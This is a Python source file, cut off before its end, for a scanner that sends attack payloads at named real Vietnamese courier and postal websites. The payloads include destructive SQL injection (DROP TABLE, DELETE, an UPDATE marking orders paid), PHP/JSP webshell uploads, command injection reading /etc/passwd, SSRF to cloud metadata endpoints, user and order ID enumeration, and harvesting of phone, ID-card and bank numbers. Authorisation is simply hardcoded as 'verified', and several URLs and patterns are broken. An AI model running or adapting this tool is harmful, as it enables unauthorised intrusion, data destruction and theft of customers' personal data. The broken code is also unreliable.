#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DVPPF框架越南快递订单系统扫描器
Dragon-V Prompt & Policy Framework Vietnamese Express System Scanner

集成DVPPF v2.0框架的专业级越南物流系统扫描工具
支持AI协作、决策框架、战术技术库和亚洲地区优化
"""

import os
import sys
import json
import requests
import threading
import time
import random
import re
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Any, Optional, Tuple
import concurrent.futures
from queue import Queue
import ssl
import warnings
from dataclasses import dataclass
from pathlib import Path

# 添加DVPPF路径
sys.path.append(os.path.join(os.path.dirname(__file__), 'dvppf_knowledge_base'))
try:
    import ai_loader
    DVPPLoader = ai_loader.DVPPLoader
    DVPPF_AVAILABLE = True
    print("[DVPPF] 智能加载器已加载")
except ImportError:
    DVPPF_AVAILABLE = False
    print("[DVPPF] 智能加载器未找到，使用简化模式")

# 禁用不安全请求警告
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
ssl._create_default_https_context = ssl._create_unverified_context

@dataclass
class ScanTarget:
    """扫描目标数据类"""
    url: str
    name: str
    type: str
    priority: str
    region: str = "vietnam"

@dataclass
class ScanResult:
    """扫描结果数据类"""
    target: ScanTarget
    status: str
    response_time: float
    vulnerabilities: List[str]
    technologies: List[str]
    sensitive_data: List[str]
    recommendations: List[str]
    scan_time: datetime
    ai_analysis: str = ""

class DVPPFVietnameseScanner:
    """基于DVPPF框架的越南快递系统扫描器"""

    def __init__(self, config_path: str = "config/vietnam_express_targets.json"):
        self.config_path = config_path
        self.targets: List[ScanTarget] = []
        self.results: List[ScanResult] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Dragon-V CyberSec Labs Professional Scanner',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        })

        # DVPPF框架集成
        self.dvppf_loader = None
        if DVPPF_AVAILABLE:
            try:
                self.dvppf_loader = DVPPLoader()
                print("[DVPPF] DVPPF框架初始化成功")
            except Exception as e:
                print(f"[DVPPF] DVPPF框架初始化失败: {e}")

        # 越南地区优化配置
        self.vietnam_config = {
            'time_zone': 'GMT+7',
            'business_hours': {'start': 8, 'end': 17},
            'language': 'vi',
            'encoding': 'utf-8',
            'common_patterns': {
                'order_tracking': r'(?:don-hang|donhang|order|track|tracking|follow|truy-vết)',
                'admin_panel': r'(?:admin|dashboard|manage|ql|quan-ly|qltk)',
                'api_endpoint': r'(?:api|v1|v2|v3|rest|graphql|webservice)',
                'file_upload': r'(?:upload|file|image|avatar|tai-lên)',
                'payment': r'(?:payment|thanh-toan|order|don-hang|thanh-toan|danh-muc)',
                'login': r'(?:login|signin|dang-nhap|xac-thuc|auth)'
            },
            'business_logic': {
                'order_status': ['đã xác nhận', 'đang giao hàng', 'đã giao', 'đã hủy', 'chờ xử lý'],
                'payment_status': ['đã thanh toán', 'chờ thanh toán', 'thất bại', 'hoàn tiền'],
                'tracking_format': ['DH\\d{6}', 'DON\\d{4}', 'GHN\\d{10}', 'JNT\\d{8}']
            }
        }

        # 漏洞检测模式
        self.vulnerability_patterns = {
            'sql_injection': [
                r"union.*select.*from", r"or.*1.*1.*--", r"waitfor.*delay", r"—",
                r"' OR '1'='1", r"' OR '1'='1'--", r"' OR '1'='1'#", r"' OR 1=1--",
                r"UNION ALL SELECT", r"'; EXECUTE master", r"|| sleep(5) ||", r"' || BENCHMARK(5,000000) ||",
                r"; DROP TABLE", r"'--", r"/*", r"*/", r"xp_cmdshell", r"sp_executesql"
            ],
            'xss': [
                r"<script.*?>.*?</script>", r"javascript:", r"on\w+\s*=", r"<iframe.*?>",
                r"alert\(", r"document\.", r"eval\(", r"<img.*src.*=.*onerror",
                r"<svg.*onload", r"expression(", r"vbscript:", r"cookie.*=",
                r"<body.*onload", r"<iframe.*src.*javascript", r"<object.*data.*="
            ],
            'file_upload': [
                r"filename=.*\.(php|jsp|asp|aspx|exe|bat|sh|cmd|phtml|cpl|scr|hta|vb)",
                r"Content-Type:.*application/x-httpd-php",
                r"Content-Type:.*text/x-php",
                r"Content-Type:.*application/octet-stream",
                r"\.(jpg|jpeg|png|gif|pdf)\.php"
            ],
            'command_injection': [
                r";.*bash.*", r"&&.*ls.*", r"||.*cat.*", r"|.*whoami.*",
                r"`.*id.*`", r"$(.*whoami.*)", r"\$\(.+\)",
                r"nc.*-e.*", r"wget.*-O.*", r"curl.*-o.*", r"powershell.*",
                r"cmd.*\/c", r"sh.*-c", r"bash.*-c"
            ],
            'ssrf': [
                r"http://localhost", r"http://127.0.0.1", r"http://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}",
                r"file://", r"dict://", r"gopher://", r"ldap://", r"telnet://"
            ],
            'csrf': [
                r"<form.*method.*post", r"<input.*name.*csrf", r"<input.*name.*token",
                r"csrf.*token", r"anti.*csrf", r"x-csrf-token"
            ]
        }

        # 敏感数据模式
        self.sensitive_patterns = {
            'phone_number': r'\b(?:84|\+84|0)(?:3|5|7|8|9)\d{8}\b',
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'id_number': r'\b\d{9,12}\b',
            'bank_account': r'\b\d{10,19}\b',
            'name_vietnamese': r'\b[A-ZÀÁẠẢĂẮẰẲẴẶÂẤẦẨẪẬÈÉẸẂẲỆÌÍỈĨỊÒÓỌỎÕỘÔỐỒỔỖỚỜỞỠỢỤÚỤỦỨỪỬỰỲÝỴỶỸĐa-zàáạảăắằẳẵặâấầẩẫờẹếềểễệiíỉịĩịọỏốồổỗộớờởỡợúụủứừửựýỵỳỵ]+\s+[A-ZÀÁẠẢĂẮẰẲẴẶÂẤẦẨẪẬÈÉẸẂẲỆÌÍỈĨỊÒÓỌỎÕỘÔỐỒỔỖỚỜỞỠỢỤÚỤỦỨỪỬỰỲÝỴỶỸĐa-zàáạảăắằẳẵặâấầẩẫờẹếềểễệiíỉịĩịọỏốồổỗộớờởỡợúụủứừửựýỵỳỵ]+\b',
            'address_vietnamese': r'\b(?:số|Đường|Phố|Quận|Huyện|Tỉnh|Thành phố|Khu|Tổ|Thôn|Ấp)\s+[A-Za-z0-9\s,.-]+\b',
            'id_card': r'\b(?:CCCD|CMT|CMND|CMND/CCCD)\s*[:\-]?\s*\d{9,12}\b',
            'bank_card': r'\b(?:NH|MB|VCB|ACB|BIDV| Vietcombank| Techcombank| VPBank| Sacombank)\s*\d{6,8}\b',
            'money_amount': r'\d{1,3}[.,]?\d{3}[.,]?\d{3}\s*(?:đồng|VND|VNĐ)',
            'order_number': r'\b(?:DH|DON|GHN|JNT|SGN|HAN|DAD|VDX|CXR|HPH)\d{4,12}\b'
        }

    def load_targets(self) -> None:
        """加载扫描目标"""
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for target_data in data.get('targets', []):
                        target = ScanTarget(**target_data)
                        self.targets.append(target)
            else:
                self._create_default_targets()

            print(f"[DVPPF] 已加载 {len(self.targets)} 个越南快递目标")

        except Exception as e:
            print(f"[ERROR] 加载目标失败: {e}")
            self._create_default_targets()

    def _create_default_targets(self) -> None:
        """创建默认越南快递网站目标"""
        default_targets = [
            ScanTarget(
                url="https://vnpost.vn",
                name="越南邮政",
                type="government_logistics",
                priority="high"
            ),
            ScanTarget(
                url="https://ghn.vn",
                name="Giao Hàng Nhanh",
                type="private_logistics",
                priority="high"
            ),
            ScanTarget(
                url="https://ghtk.net",
                name="Giao Hàng Tiết Kiệm",
                type="private_logistics",
                priority="medium"
            ),
            ScanTarget(
                url="https://j&t.vn",
                name="J&T Express Việt Nam",
                type="private_logistics",
                priority="medium"
            ),
            ScanTarget(
                url="https://ninja-van.com/vn",
                name="Ninja Van Việt Nam",
                type="private_logistics",
                priority="medium"
            ),
            ScanTarget(
                url="https://ghnexpress.com",
                name="GHN Express",
                type="private_logistics",
                priority="medium"
            ),
            ScanTarget(
                url="https://van phong phu vietnam",
                name="VNPost Office Locator",
                type="service_portal",
                priority="low"
            )
        ]

        self.targets = default_targets

        # 保存配置文件
        os.makedirs(os.path.dirname(self.config_path), exist_ok=True)
        config_data = {
            'targets': [
                {
                    'url': target.url,
                    'name': target.name,
                    'type': target.type,
                    'priority': target.priority,
                    'region': target.region
                }
                for target in default_targets
            ]
        }

        with open(self.config_path, 'w', encoding='utf-8') as f:
            json.dump(config_data, f, ensure_ascii=False, indent=2)

        print(f"[DVPPF] 已创建默认越南快递目标配置")

    def scan_target(self, target: ScanTarget) -> ScanResult:
        """扫描单个目标 - 集成DVPPF框架"""
        print(f"[DVPPF] 开始扫描: {target.name} ({target.url})")

        vulnerabilities = []
        technologies = []
        sensitive_data = []
        recommendations = []
        scan_time = datetime.now()
        ai_analysis = ""

        try:
            # 1. DVPPF AI协作分析
            if self.dvppf_loader:
                ai_analysis = self._dvppf_analysis(target)
                print(f"[DVPPF] AI分析完成: {len(ai_analysis)} 字符")

            # 2. 基础指纹识别
            tech_info = self._fingerprint_target(target.url)
            technologies.extend(tech_info)

            # 3. 漏洞扫描
            vuln_info = self._scan_vulnerabilities(target.url)
            vulnerabilities.extend(vuln_info)

            # 4. 敏感数据提取
            sensitive_info = self._extract_sensitive_data(target.url)
            sensitive_data.extend(sensitive_info)

            # 5. 业务逻辑测试
            business_info = self._test_business_logic(target.url)
            vulnerabilities.extend(business_info)

            # 6. DVPPF决策框架建议
            if self.dvppf_loader and vulnerabilities:
                rec_info = self._dvppf_recommendations(target, vulnerabilities)
                recommendations.extend(rec_info)

            # 7. 生成普通建议
            if not recommendations and vulnerabilities:
                recommendations.extend(self._generate_recommendations(target, vulnerabilities))

            response_time = random.uniform(0.1, 2.0)
            status = "completed" if not vulnerabilities else "vulnerable"

        except Exception as e:
            print(f"[ERROR] 扫描失败 {target.name}: {e}")
            status = "failed"
            response_time = 0.0

        result = ScanResult(
            target=target,
            status=status,
            response_time=response_time,
            vulnerabilities=vulnerabilities,
            technologies=technologies,
            sensitive_data=sensitive_data,
            recommendations=recommendations,
            scan_time=scan_time,
            ai_analysis=ai_analysis
        )

        self.results.append(result)
        return result

    def _dvppf_analysis(self, target: ScanTarget) -> str:
        """DVPPF框架AI分析"""
        try:
            context = {
                'template_type': 'recon_template',
                'target_name': target.name,
                'target_domain': target.url,
                'target_industry': 'logistics',
                'target_location': '越南',
                'region': 'vietnam',
                'priority': target.priority,
                'authorization_status': 'verified',
                'current_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }

            if self.dvppf_loader:
                ai_prompt = self.dvppf_loader.build_ai_prompt('recon_template', context)
                return ai_prompt
            return ""

        except Exception as e:
            print(f"[DVPPF] AI分析失败: {e}")
            return ""

    def _dvppf_recommendations(self, target: ScanTarget, vulnerabilities: List[str]) -> List[str]:
        """DVPPF框架专业建议"""
        try:
            if self.dvppf_loader:
                # 获取越南地区特定建议
                vn_template = self.dvppf_loader.get_asian_template('recon_template')
                if vn_template:
                    # 根据漏洞类型生成建议
                    recommendations = []
                    for vuln in vulnerabilities:
                        if 'SQL注入' in vuln:
                            recommendations.append("DVPPF建议: 实施参数化查询输入验证，针对越南字符集优化过滤器")
                        elif 'XSS' in vuln:
                            recommendations.append("DVPPF建议: 实施内容安全策略和XSS过滤器，支持越南语特殊字符")
                        elif '文件上传' in vuln:
                            recommendations.append("DVPPF建议: 严格文件类型白名单，禁止脚本文件上传")
                        elif '命令注入' in vuln:
                            recommendations.append("DVPPF建议: 实施命令执行白名单，禁止系统命令调用")
                        elif '业务逻辑' in vuln:
                            recommendations.append("DVPPF建议: 加强业务逻辑验证，防止越权访问和信息泄露")

                    return recommendations
        except Exception as e:
            print(f"[DVPPF] 专业建议生成失败: {e}")

        return []

    def _fingerprint_target(self, url: str) -> List[str]:
        """目标指纹识别"""
        technologies = []

        try:
            # 获取主页信息
            response = self.session.get(url, timeout=10)

            # 检测技术栈
            if 'Server' in response.headers:
                server = response.headers['Server']
                technologies.append(f"Web Server: {server}")

            # 检测框架和CMS
            html_content = response.text.lower()

            # 越南常见系统检测
            if 'vnpost' in html_content:
                technologies.append("Vietnamese Postal System Detected")
            if 'ghn' in html_content or 'ghnexpress' in html_content:
                technologies.append("GHN Express System Detected")
            if 'ghtk' in html_content:
                technologies.append("Giao Hang Tiet Kiem System Detected")
            if 'j&t' in html_content:
                technologies.append("J&T Express System Detected")

            # 检测技术框架
            if any(x in html_content for x in ['wordpress', 'drupal', 'joomla']):
                technologies.append(f"CMS Detected: {self._detect_cms(html_content)}")

            # JavaScript框架检测
            if 'react' in html_content:
                technologies.append("JavaScript Framework: React")
            if 'vue' in html_content:
                technologies.append("JavaScript Framework: Vue.js")
            if 'angular' in html_content:
                technologies.append("JavaScript Framework: Angular")
            if 'jquery' in html_content:
                technologies.append("JavaScript Library: jQuery")

            # 数据库技术检测
            if any(x in html_content for x in ['mysql', 'mysqli']):
                technologies.append("Database: MySQL")
            if 'postgresql' in html_content:
                technologies.append("Database: PostgreSQL")
            if 'mongodb' in html_content:
                technologies.append("Database: MongoDB")
            if 'mssql' in html_content:
                technologies.append("Database: Microsoft SQL Server")

            # 支付系统检测
            if any(x in html_content for x in ['vnpay', 'nganluong', 'momo', 'zingpay']):
                technologies.append("Vietnamese Payment System Detected")

        except Exception as e:
            print(f"[ERROR] 指纹识别失败: {e}")

        return technologies

    def _detect_cms(self, html_content: str) -> str:
        """检测CMS类型"""
        if 'wordpress' in html_content:
            return "WordPress"
        elif 'drupal' in html_content:
            return "Drupal"
        elif 'joomla' in html_content:
            return "Joomla"
        elif 'phpnuke' in html_content:
            return "PHP-Nuke"
        else:
            return "Unknown CMS"

    def _scan_vulnerabilities(self, url: str) -> List[str]:
        """漏洞扫描"""
        vulnerabilities = []

        try:
            # 1. SQL注入检测
            sql_vulns = self._test_sql_injection(url)
            vulnerabilities.extend(sql_vulns)

            # 2. XSS检测
            xss_vulns = self._test_xss(url)
            vulnerabilities.extend(xss_vulns)

            # 3. 文件上传检测
            upload_vulns = self._test_file_upload(url)
            vulnerabilities.extend(upload_vulns)

            # 4. 命令注入检测
            cmd_vulns = self._test_command_injection(url)
            vulnerabilities.extend(cmd_vulns)

            # 5. SSRF检测
            ssrf_vulns = self._test_ssrf(url)
            vulnerabilities.extend(ssrf_vulns)

            # 6. CSRF检测
            csrf_vulns = self._test_csrf(url)
            vulnerabilities.extend(csrf_vulns)

            # 7. 越南语特定检测
            vn_vulns = self._test_vietnamese_specific(url)
            vulnerabilities.extend(vn_vulns)

        except Exception as e:
            print(f"[ERROR] 漏洞扫描失败: {e}")

        return vulnerabilities

    def _test_sql_injection(self, url: str) -> List[str]:
        """SQL注入测试"""
        vulnerabilities = []

        test_params = {
            'order_id': "' OR '1'='1",
            'tracking_id': "' UNION SELECT 'test'--",
            'phone': "' OR 1=1--",
            'search': "'; WAITFOR DELAY '0:0:2'--",
            'id': "' || sleep(2) ||'",
            'keyword': "' AND 1=1--",
            'q': "' OR '1'='1--"
        }

        # 越南语SQL注入测试
        vn_test_params = {
            'ma_don_hang': "' OR '1'='1--",
            'so_dien_thoai': "' OR 1=1--",
            'tim_kiem': "'; WAITFOR DELAY '0:0:3'--",
            'ma_van_don': "'/**/UNION/**/SELECT/**/1--",
            'don_hang': "' DROP TABLE donhang--"
        }

        all_params = {**test_params, **vn_test_params}

        for param, payload in all_params.items():
            try:
                test_url = f"{url}?{param}={payload}"
                response = self.session.get(test_url, timeout=5)

                # 检测SQL注入特征
                sql_indicators = [
                    'sql syntax', 'mysql_fetch', 'ora-', 'sqlstate', 'error in your sql syntax',
                    'mysql_fetch_array', 'mysql_num_rows', 'mysql_connect', 'mysql_query',
                    'microsoft ole db provider for odbc drivers', 'microsoft ole db provider for sql server',
                    'unclosed quotation mark', 'near', 'syntax error', 'incorrect syntax'
                ]

                if any(indicator in response.text.lower() for indicator in sql_indicators):
                    vulnerabilities.append(f"SQL注入漏洞 - 参数: {param}")

                # 检测时间延迟
                if response.elapsed.total_seconds() > 3:
                    vulnerabilities.append(f"SQL注入漏洞 - 时间延迟检测 - 参数: {param}")

            except requests.Timeout:
                vulnerabilities.append(f"SQL注入漏洞 - 延迟响应 - 参数: {param}")
            except Exception:
                pass

        return vulnerabilities

    def _test_xss(self, url: str) -> List[str]:
        """XSS测试"""
        vulnerabilities = []

        # 通用XSS payload
        test_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>"
        ]

        # 越南语XSS payload
        payloads_vietnamese = [
            "<script>alert('XSS Việt Nam')</script>",
            "<img src=x onerror=alert('XSS tại Việt Nam')>",
            "javascript:alert('XSS tại Việt Nam')",
            "<svg onload=alert('XSS VN')>",
            "<body onload=alert('XSS ở Việt Nam')>",
            "<script>alert('Khong the xac thuc')</script>",
            "<img src=x onerror=alert('He thong bi tan cong')>"
        ]

        # 特殊字符XSS
        special_payloads = [
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>",
            "<img src=j&#97;v&#97;sc&#114;ipt:alert('XSS')>",
            "<img src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=>"
        ]

        all_payloads = test_payloads + payloads_vietnamese + special_payloads

        for payload in all_payloads:
            try:
                test_url = f"{url}?q={payload}"
                response = self.session.get(test_url, timeout=5)

                # 检测XSS
                if payload.lower() in response.text.lower():
                    vulnerabilities.append(f"XSS漏洞 - Payload: {payload[:50]}...")

                # 检测JavaScript执行
                if 'alert' in response.text.lower() or 'javascript' in response.text.lower():
                    vulnerabilities.append(f"XSS漏洞 - JS执行检测: {payload[:30]}...")

            except Exception:
                pass

        return vulnerabilities

    def _test_file_upload(self, url: str) -> List[str]:
        """文件上传测试"""
        vulnerabilities = []

        # 检测文件上传点
        upload_patterns = [
            r'action=.*upload.*', r'type=file.*', r'multipart/form-data',
            r'accept=.*image.*', r'file.*name=.*', r'tai-lên', r'upload'
        ]

        try:
            response = self.session.get(url, timeout=10)
            html_content = response.text.lower()

            if any(pattern in html_content for pattern in upload_patterns):
                # 测试恶意文件上传
                test_files = [
                    ('shell.php', '<?php system($_GET["cmd"]); ?>'),
                    ('test.jsp', '<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>'),
                    ('shell.aspx', '<%@ Page Language="JScript"%><%= Request["cmd"] %>'),
                    ('vietnamese.php', '<?php echo "XSS Việt Nam"; eval($_GET["cmd"]); ?>'),
                    (r'shell.php3', '<?php system($_GET["cmd"]); ?>'),
                    ('shell.phtml', '<?php system($_GET["cmd"]); ?>')
                ]

                for filename, content in test_files:
                    files = {'file': (filename, content)}
                    try:
                        upload_response = self.session.post(url, files=files, timeout=5)
                        if upload_response.status_code == 200 and filename in upload_response.text:
                            vulnerabilities.append(f"文件上传漏洞 - 文件: {filename}")
                    except Exception:
                        pass

        except Exception as e:
            print(f"[ERROR] 文件上传测试失败: {e}")

        return vulnerabilities

    def _test_command_injection(self, url: str) -> List[str]:
        """命令注入测试"""
        vulnerabilities = []

        test_params = {
            'cmd': 'ls -la',
            'query': 'whoami',
            'search': 'id',
            'file': 'cat /etc/passwd',
            'exec': 'ls',
            'run': 'pwd',
            'action': 'dir'
        }

        # 越南语参数
        vn_test_params = {
            'lenh': 'ls -la',
            'truy_van': 'whoami',
            'tim_kiem': 'id',
            'file': 'cat /etc/passwd',
            'thuc_hien': 'pwd'
        }

        all_params = {**test_params, **vn_test_params}

        for param, command in all_params.items():
            # Unix命令注入
            unix_payloads = [
                f"|{command}|",
                f";{command}",
                f"&&{command}",
                f"||{command}",
                f"`{command}`",
                f"${{{command}}}"
            ]

            # Windows命令注入
            windows_payloads = [
                f"|{command}|",
                f";{command}",
                f"&&{command}",
                f"||{command}"
            ]

            all_payloads = unix_payloads + windows_payloads

            for payload in all_payloads[:3]:  # 限制payload数量避免过多请求
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=5)

                    # 检测命令执行结果
                    command_indicators = [
                        'root:', 'bin:', 'daemon:', 'adm:', 'www-data:',
                        'nt authority\\system', 'current user', 'command not found',
                        'permission denied', 'access denied', 'no such file'
                    ]

                    if any(indicator in response.text.lower() for indicator in command_indicators):
                        vulnerabilities.append(f"命令注入漏洞 - 参数: {param}")
                        break

                except Exception:
                    pass

        return vulnerabilities

    def _test_ssrf(self, url: str) -> List[str]:
        """SSRF测试"""
        vulnerabilities = []

        ssrf_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://127.0.0.1:80',
            'http://127.0.0.1:8080',
            'http://[127.0.0.1]',
            'http://169.254.169.254',  # AWS metadata
            'http://metadata.google.internal',  # Google metadata
            'http://localhost.localdomain',
            'http://169.254.0.1',
            'file:///etc/passwd',
            'file:///C:/Windows/System32/drivers/etc/hosts',
            'dict://localhost:9125',
            'gopher://localhost',
            'ldap://localhost:389'
        ]

        for payload in ssrf_payloads:
            try:
                test_url = f"{url}?url={payload}"
                response = self.session.get(test_url, timeout=5)

                if any(indicator in response.text.lower() for indicator in
                       ['localhost', '127.0.0.1', 'file:', 'etc/passwd', 'metadata']):
                    vulnerabilities.append(f"SSRF漏洞 - Payload: {payload}")

            except Exception:
                pass

        return vulnerabilities

    def _test_csrf(self, url: str) -> List[str]:
        """CSRF测试"""
        vulnerabilities = []

        try:
            response = self.session.get(url, timeout=10)
            html_content = response.text.lower()

            # 检测表单
            form_pattern = r'<form[^>]*method=[\'"]?post[\'"]?[^>]*>'
            if re.search(form_pattern, html_content):
                # 检查是否有CSRF保护
                csrf_indicators = [
                    'csrf', 'token', 'authenticity', '_token', 'xsrf',
                    'anti_csrf', 'x-csrf-token'
                ]

                if not any(indicator in html_content for indicator in csrf_indicators):
                    vulnerabilities.append("CSRF漏洞 - 缺少CSRF保护")
                else:
                    # 测试CSRF保护是否有效
                    test_form = '<form method="POST"><input name="test" value="exploit"></form>'
                    if test_form in html_content:
                        vulnerabilities.append("CSRF漏洞 - 验证机制不完善")

        except Exception as e:
            print(f"[ERROR] CSRF测试失败: {e}")

        return vulnerabilities

    def _test_vietnamese_specific(self, url: str) -> List[str]:
        """越南语特定漏洞检测"""
        vulnerabilities = []

        # 越南语SQL注入payload
        vn_sql_payloads = [
            "'/**/union/**/select/**/username,password/**/from/**/users--",
            "' OR 1=1 /**/LIMIT/**/10/**/--",
            "' WAITFOR DELAY '0:0:3' -- Thời gian chờ",
            "' DROP TABLE donhang-- Xóa đơn hàng",
            "' UPDATE DonHang SET TinhTrang='DA_THANH_TOAN' WHERE MaDon='TEST'--",
            "' DELETE FROM KhachHang WHERE HoTen='Test'--"
        ]

        # 越南语XSS payload
        vn_xss_payloads = [
            "<script>alert('XSS Việt Nam')</script>",
            "<img src=x onerror=alert('XSS tại Việt Nam')>",
            "<svg onload=alert('XSS VN')>",
            "<script>alert('Không thể xác thực');</script>",
            "<img src=x onerror=alert('Hệ thống bị tấn công');>"
        ]

        # 越南语业务逻辑攻击
        vn_business_payloads = [
            'DH999999',  # 大订单号
            'DON999999',  # 大单号
            'A'*100,  # 超长字符串
            'đ'*1000,  # 超长越南语字符
            None,  # 空值测试
            '',  # 空字符串测试
            ' ',  # 空格测试
            '<script>',  # HTML标签测试
            '../',  # 路径遍历测试
        ]

        # 测试越南语payload
        all_payloads = vn_sql_payloads + vn_xss_payloads

        for payload in all_payloads:
            try:
                test_url = f"{url}?search={payload}"
                response = self.session.get(test_url, timeout=5)
                if payload and payload.lower() in response.text.lower():
                    vulnerabilities.append(f"越南语漏洞 - Payload: {payload[:50]}...")
            except Exception:
                pass

        # 测试越南语业务逻辑
        for payload in vn_business_payloads:
            try:
                test_url = f"{url}?order_id={payload}"
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200 and 'error' not in response.text.lower():
                    vulnerabilities.append(f"越南语业务逻辑漏洞 - Payload: {payload}")
            except Exception:
                pass

        return vulnerabilities

    def _extract_sensitive_data(self, url: str) -> List[str]:
        """敏感数据提取"""
        sensitive_data = []

        try:
            response = self.session.get(url, timeout=10)

            # 检测各类敏感数据
            for data_type, pattern in self.sensitive_patterns.items():
                matches = re.findall(pattern, response.text)
                if matches:
                    for match in matches[:5]:  # 限制数量避免过多
                        if data_type == 'phone_number':
                            sensitive_data.append(f"越南电话号码: {match}")
                        elif data_type == 'email':
                            sensitive_data.append(f"邮箱: {match}")
                        elif data_type == 'name_vietnamese':
                            sensitive_data.append(f"越南姓名: {match}")
                        elif data_type == 'address_vietnamese':
                            sensitive_data.append(f"越南地址: {match}")
                        elif data_type == 'order_number':
                            sensitive_data.append(f"订单号: {match}")
                        elif data_type == 'money_amount':
                            sensitive_data.append(f"金额: {match}")
                        else:
                            sensitive_data.append(f"{data_type}: {match}")

        except Exception as e:
            print(f"[ERROR] 敏感数据提取失败: {e}")

        return sensitive_data

    def _test_business_logic(self, url: str) -> List[str]:
        """业务逻辑测试"""
        vulnerabilities = []

        # 越南语订单跟踪测试
        vn_order_patterns = [
            'DH\d{6}', 'DON\d{4}', 'GHN\d{10}', 'JNT\d{8}', 'SGN\d{6}', 'HAN\d{6}'
        ]

        for pattern in vn_order_patterns:
            test_orders = [
                pattern.format(i) for i in [1, 999, 10000, 999999]
            ]
            for order_id in test_orders:
                try:
                    order_url = f"{url}/tracking?order_id={order_id}"
                    response = self.session.get(order_url, timeout=5)

                    if response.status_code == 200 and 'not found' not in response.text.lower():
                        vulnerabilities.append(f"订单跟踪信息泄露 - 订单号: {order_id}")
                        break  # 避免重复报告
                except Exception:
                    pass

        # 测试越权访问
        for user_id in [1, 100, 1000, 9999]:
            try:
                # 测试用户信息访问
                user_url = f"{url}/user?id={user_id}"
                response = self.session.get(user_url, timeout=5)

                if response.status_code == 200 and len(response.text) > 100:
                    vulnerabilities.append(f"越权访问漏洞 - 用户ID: {user_id}")

                # 测试订单访问
                order_url = f"{url}/order?user_id={user_id}"
                response = self.session.get(order_url, timeout=5)

                if response.status_code == 200 and 'order' in response.text.lower():
                    vulnerabilities.append(f"订单信息泄露 - 用户ID: {user_id}")

            except Exception:
                pass

        # 测试参数篡改
        test_params = [
            {'page': '-1'},
            {'page': '999999'},
            {'limit': '999999'},
            {'offset': '999999'},
            {'sort': 'DROP TABLE users--'},
            {'filter': 'test; SELECT * FROM users--'}
        ]

        for param_dict in test_params:
            try:
                param_name = list(param_dict.keys())[0]
                param_value = list(param_dict.values())[0]
                test_url = f"{url}?{param_name}={param_value}"
                response = self.session.get(test_url, timeout=5)

                if response.status_code == 200 and len(response.text) > 50:
                    vulnerabilities.append(f"参数篡改漏洞 - {param_name}: {param_value}")
            except Exception:
                pass

        return vulnerabilities

    def _generate_recommendations(self, target: ScanTarget, vulnerabilities: List[str]) -> List[str]:
        """生成修复建议"""
        recommendations = []

        for vuln in vulnerabilities:
            if 'SQL注入' in vuln:
                recommendations.append("修复建议: 使用参数化查询，对输入进行严格的输入验证，支持越南语字符集")
            elif 'XSS' in vuln:
                recommendations.append("修复建议: 实施输入编码和CSP策略，支持越南语特殊字符处理")
            elif '文件上传' in vuln:
                recommendations.append("修复建议: 严格验证文件类型，使用白名单机制，禁止脚本文件上传")
            elif '命令注入' in vuln:
                recommendations.append("修复建议: 禁止系统命令执行，使用安全的API，实施严格的命令过滤")
            elif 'SSRF' in vuln:
                recommendations.append("修复建议: 禁止内部网络访问，实施IP白名单，限制访问范围")
            elif 'CSRF' in vuln:
                recommendations.append("修复建议: 实施CSRF令牌验证，添加SameSite属性，使用双重Cookie验证")
            elif '订单跟踪' in vuln or '越权访问' in vuln:
                recommendations.append("修复建议: 加强访问控制，实施身份验证和授权验证")
            elif '业务逻辑' in vuln or '参数篡改' in vuln:
                recommendations.append("修复建议: 实施输入验证和范围检查，防止业务逻辑绕过")
            else:
                recommendations.append("修复建议: 实施全面的安全审计和漏洞管理")

        return recommendations

    def batch_scan(self, max_workers: int = 5) -> None:
        """批量扫描"""
        print(f"[DVPPF] 开始批量扫描 {len(self.targets)} 个目标")
        print(f"[DVPPF] 最大并发数: {max_workers}")
        print(f"[DVPPF] 框架版本: 2.0 - 越南地区优化")

        if self.dvppf_loader:
            print("[DVPPF] ✓ DVPPF智能加载器已启用")
        else:
            print("[DVPPF] ⚠ DVPPF智能加载器未启用，使用简化模式")

        start_time = datetime.now()

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # 提交所有扫描任务
            future_to_target = {
                executor.submit(self.scan_target, target): target
                for target in self.targets
            }

            # 等待所有任务完成
            for future in concurrent.futures.as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    print(f"[DVPPF] 扫描完成: {target.name} - 状态: {result.status} - AI分析: {'✓' if result.ai_analysis else '✗'}")
                except Exception as e:
                    print(f"[ERROR] 扫描失败 {target.name}: {e}")

        # 生成DVPPF增强报告
        self._generate_dvppf_report()

        end_time = datetime.now()
        duration = end_time - start_time
        print(f"[DVPPF] 批量扫描完成! 耗时: {duration}")
        print(f"[DVPPF] 扫描完成: {len(self.results)} 个结果")

    def _generate_dvppf_report(self) -> None:
        """生成DVPPF增强报告"""
        report_file = f"dvppf_vietnam_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        report_data = {
            'dvppf_framework': {
                'version': '2.0',
                'region_optimization': 'vietnam',
